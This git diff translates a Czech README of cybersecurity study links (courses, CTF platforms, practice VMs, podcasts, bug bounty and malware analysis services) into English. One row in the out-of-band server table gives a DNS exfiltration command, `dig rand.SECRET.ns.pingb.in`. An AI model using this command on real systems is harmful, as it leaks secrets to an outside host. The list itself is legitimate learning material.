@@ -1,12 +1,10 @@
-# Rozcestník pro samostudium kybernetické bezpečnosti
+# Cybersecurity Knowledge Base
 
-Užitečné odkazy pro oblast kybernetické bezpečnosti, zejména penetračního testování.
-Jako gitbook dostupné na [chovanecadam.gitbook.io/cybersecurity/](https://chovanecadam.gitbook.io/cybersecurity/),
-gitový repozitář na [github.com/chovanecadam/cybersecurity](https://github.com/chovanecadam/cybersecurity).
+Useful links for the study of cybersecurity, penetration testing, and red-teaming in general.
+Also avialable on [gitbook](https://chovanecadam.gitbook.io/cybersecurity) and 
+[github](https://github.com/chovanecadam/cybersecurity).
 
-Kromě odkazů sem budu přidávat i vlastní poznámky, ale to nejspíš jen sporadicky[.](https://youtu.be/dQw4w9WgXcQ)
-
-## Interaktivní tutoriály a kurzy
+## Interactive Tutorials And Courses
 
 * [PortsWigger Web Security Academy](https://portswigger.net/web-security)
 * [Hacker 101](https://www.hacker101.com/)
@@ -33,14 +31,14 @@ Kromě odkazů sem budu přidávat i vlastní poznámky, ale to nejspíš jen sp
 * [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
 * [PenetrationTesting](https://github.com/wtsxDev/Penetration-Testing)
 
-## Cheatsheets, návody, knihy
+## Cheatsheets, tutorials, book
 
 * [HackTricks](https://book.hacktricks.xyz/)
 * [HackSplaining](https://www.hacksplaining.com/)
 * [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
 * [GTFOBins](https://gtfobins.github.io/)
 
-## Videa, konference, YouTube
+## Videos, Conferences, YouTube
 
 * [defcon.org](https://www.youtube.com/user/DEFCONConference/playlists)
 * [BlackHat](https://www.youtube.com/user/BlackHatOfficialYT)
@@ -59,7 +57,7 @@ Kromě odkazů sem budu přidávat i vlastní poznámky, ale to nejspíš jen sp
 * [John Hammond](https://www.youtube.com/channel/UCVeW9qkBjo3zosnqUbG7CFw)
 * [Hacksplained](https://www.youtube.com/c/Hacksplained/videos)
 
-## Podcasty
+## Podcasts
 
 * [Malicious Life](https://malicious.life/)
 * [Security Now](https://twit.tv/shows/security-now)
@@ -72,7 +70,7 @@ Kromě odkazů sem budu přidávat i vlastní poznámky, ale to nejspíš jen sp
 * [The PRIVACY, SECURITY, & OSINT Show](https://inteltechniques.com/podcast.html)
 * [Naked Security Podcast](https://podcasts.apple.com/us/podcast/naked-security/id171426676)
 
-## Offline virtuálky a sandboxy pro hackování
+## Virtual Machines and Sandboxes for Hacking
 
 * [OWASP Juice Shop Project](https://owasp.org/www-project-juice-shop/)
 * [Damn Vulnerable Web Application](https://github.com/ethicalhack3r/DVWA)
@@ -82,7 +80,7 @@ Kromě odkazů sem budu přidávat i vlastní poznámky, ale to nejspíš jen sp
 * [vulnhub.com](https://www.vulnhub.com/)
 * [OWASP Mutillidae II](https://github.com/webpwnized/mutillidae)
 
-## On-line cvičení a CTFs
+## CTF and Online Hacking Platforms
 
 * [Kybersoutěž](https://www.kybersoutez.cz/)
 * [Hack The Box](https://hackthebox.eu)
@@ -101,7 +99,7 @@ Kromě odkazů sem budu přidávat i vlastní poznámky, ale to nejspíš jen sp
 * [Over The Wire](https://overthewire.org/)
 * [defendtheweb.net](https://defendtheweb.net)
 
-## Bug Bounty platformy
+## Bug Bounty Platforms
 
 * [Hacker One](https://www.hackerone.com/)
 * [BugCrowd](https://www.bugcrowd.com/)
@@ -109,22 +107,22 @@ Kromě odkazů sem budu přidávat i vlastní poznámky, ale to nejspíš jen sp
 
 ## Malware analysis
 
-| název                                    | popis                                     |
+| name                                    | description                                     |
 | ---------------------------------------- | ----------------------------------------- |
-| [VirusTotal](https://www.virustotal.com) | Analýza malwaru, hashe, URL, pcapu        |
-| [AnyRun](https://app.any.run/)           | Interaktivní analýza malwaru              |
-| [Triage](https://tria.ge/)               | Hybridní analýza malwaru                  |
-| [VMRay](https://www.vmray.com)           | dynamická analýza malwaru, placená služba |
-| [Hybrid Analysis](https://hybrid-analysis.com/) | dynamická analýza malwaru          |
+| [VirusTotal](https://www.virustotal.com) | analysis of malware, hash, url, pcap      |
+| [AnyRun](https://app.any.run/)           | online interactive malware analysis       |
+| [Triage](https://tria.ge/)               | dynamic and static malware analysis       |
+| [VMRay](https://www.vmray.com)           | dynamic malware analysis, paid service   |
+| [Hybrid Analysis](https://hybrid-analysis.com/) | dynamic malware analysis           |
 
-## Temporary domény, url, emaily, OOB servery
+## Temporary domains, URLs, emails, and OOB servers
 
-| název                                   | popis                                                             |
+| name                                    | description                                                       |
 | --------------------------------------- | ----------------------------------------------------------------- |
-| [webhook.site](https://webhook.site/)   | asi nejlepší možnost, až 500 requestů                             |
-| [pingb.in](http://pingb.in)             | data exiltration pomocí DNS lookup: `dig rand.SECRET.ns.pingb.in` |
-| [RequestBin.net](http://requestbin.net) | veřejné URL, ukazuje HTTP hlavičky, POST parametry, GET parametry |
+| [webhook.site](https://webhook.site/)   | probably the best choice, up to 500 requests, offers VIP          |
+| [pingb.in](http://pingb.in)             | data exfiltration by DNS: `dig rand.SECRET.ns.pingb.in`           |
+| [RequestBin.net](http://requestbin.net) | public URL, displays HTTP headers, GET and POST parameters        |
 
-## Blogy
+## Blogs
 
 * [CRYPTSUS](https://cryptsus.com/blog/)
